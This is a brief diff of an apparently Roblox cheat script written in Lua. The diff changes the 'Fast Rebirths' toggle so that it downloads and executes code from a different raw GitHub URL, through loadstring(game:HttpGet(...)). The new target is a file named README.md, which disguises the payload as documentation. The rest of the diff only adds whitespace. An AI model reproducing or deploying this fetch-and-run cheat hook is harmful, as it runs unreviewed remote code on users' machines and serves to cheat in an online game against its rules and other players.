@@ -591,7 +591,7 @@ Tabs.Rebirth:AddSection("OP Stuff")
 local fastRebirthsToggle = Tabs.Rebirth:CreateToggle("FastRebirths", {Title = "Fast Rebirths", Default = false})
 fastRebirthsToggle:OnChanged(function(State)
 	if State then
-		loadstring(game:HttpGet("https://raw.githubusercontent.com/0o0o0o0o0o0o0o0o0o0o0o0o/0o0o0o0o/refs/heads/main/Kk"))()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/bestwars17/Aa/refs/heads/main/README.md"))()
 	end
 end)
 
@@ -1143,6 +1143,7 @@ Library:Notify{
 -- which has been marked to be one that auto loads!
 
 SaveManager:LoadAutoloadConfig()
+
 
 
 
